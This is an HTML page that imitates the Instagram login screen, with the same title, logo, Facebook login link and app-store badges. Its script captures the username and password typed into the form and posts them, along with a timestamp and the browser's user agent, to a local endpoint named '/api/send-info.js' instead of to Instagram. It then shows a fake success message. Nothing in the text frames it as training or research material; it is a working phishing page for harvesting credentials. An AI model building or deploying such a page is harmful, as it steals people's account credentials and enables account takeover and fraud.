<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram â€¢ Log in</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 350px;
            max-width: 100%;
        }

        .login-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 20px 40px;
            width: 100%;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo-section {
            margin: 20px 0 30px;
            width: 175px;
        }

        .logo {
            width: 100%;
        }

        .login-form {
            display: flex;
            flex-direction: column;
            width: 100%;
        }

        .login-form input {
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 9px 0 7px 8px;
            margin-bottom: 6px;
            font-size: 12px;
        }

        .login-form input::placeholder {
            color: #8e8e8e;
        }

        .login-form button {
            background-color: #0095f6;
            color: #fff;
            border: none;
            border-radius: 8px;
            padding: 8px;
            margin: 8px 0;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .login-form button:hover {
            background-color: #1877f2;
        }

        .login-form button:disabled {
            background-color: #b2dffc;
            cursor: not-allowed;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 15px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .line {
            flex-grow: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .or {
            padding: 0 18px;
        }

        .facebook-login {
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            font-weight: 600;
            color: #385185;
            margin: 10px 0;
            cursor: pointer;
        }

        .fb-logo {
            width: 16px;
            margin-right: 8px;
        }

        .forgot-password {
            font-size: 12px;
            color: #00376b;
            text-align: center;
            margin-top: 12px;
            text-decoration: none;
        }

        .signup-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 20px;
            width: 100%;
            box-sizing: border-box;
            text-align: center;
            margin-top: 10px;
            font-size: 14px;
        }

        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .app-download {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 20px;
        }

        .app-download p {
            font-size: 14px;
            margin: 10px 0;
        }

        .app-buttons {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            justify-content: center;
        }

        .app-buttons img {
            width: 135px;
            height: 40px;
        }

        .error-message {
            color: #ed4956;
            font-size: 12px;
            text-align: center;
            margin: 10px 0;
            display: none;
        }

        .success-message {
            color: #00a400;
            font-size: 12px;
            text-align: center;
            margin: 10px 0;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo-section">
                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
            </div>
            <form class="login-form" id="loginForm">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
                <input type="password" id="password" placeholder="Password" required>
                <div class="error-message" id="errorMessage">
                    Sorry, there was a problem. Please try again.
                </div>
                <div class="success-message" id="successMessage">
                    Logging in...
                </div>
                <button type="submit" id="submitBtn">Log In</button>
                <div class="divider">
                    <div class="line"></div>
                    <div class="or">OR</div>
                    <div class="line"></div>
                </div>
                <div class="facebook-login">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="fb-logo">
                    <span>Log in with Facebook</span>
                </div>
                <a href="#" class="forgot-password">Forgot password?</a>
            </form>
        </div>

        <div class="signup-box">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>

        <div class="app-download">
            <p>Get the app.</p>
            <div class="app-buttons">
                <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play"></a>
                <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="Download on the App Store"></a>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const submitBtn = document.getElementById('submitBtn');
            const errorMessage = document.getElementById('errorMessage');
            const successMessage = document.getElementById('successMessage');
            
            // Reset messages
            errorMessage.style.display = 'none';
            successMessage.style.display = 'none';
            
            // Disable button
            submitBtn.disabled = true;
            submitBtn.textContent = 'Logging in...';
            
            try {
                const response = await fetch('/api/send-info.js', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        username: username,
                        password: password,
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent
                    })
                });
                
                const data = await response.json();
                
                if (response.ok && data.success) {
                    successMessage.textContent = 'Success! Redirecting...';
                    successMessage.style.display = 'block';
                    
                    // Optional: Redirect to Instagram or show success
                    setTimeout(() => {
                        // window.location.href = 'https://www.instagram.com';
                        // Or clear form
                        document.getElementById('loginForm').reset();
                        submitBtn.disabled = false;
                        submitBtn.textContent = 'Log In';
                        successMessage.style.display = 'none';
                    }, 2000);
                } else {
                    errorMessage.textContent = data.message || 'Sorry, there was a problem. Please try again.';
                    errorMessage.style.display = 'block';
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Log In';
                }
            } catch (error) {
                console.error('Error:', error);
                errorMessage.textContent = 'Network error. Please check your connection.';
                errorMessage.style.display = 'block';
                submitBtn.disabled = false;
                submitBtn.textContent = 'Log In';
            }
        });
    </script>
</body>
</html>
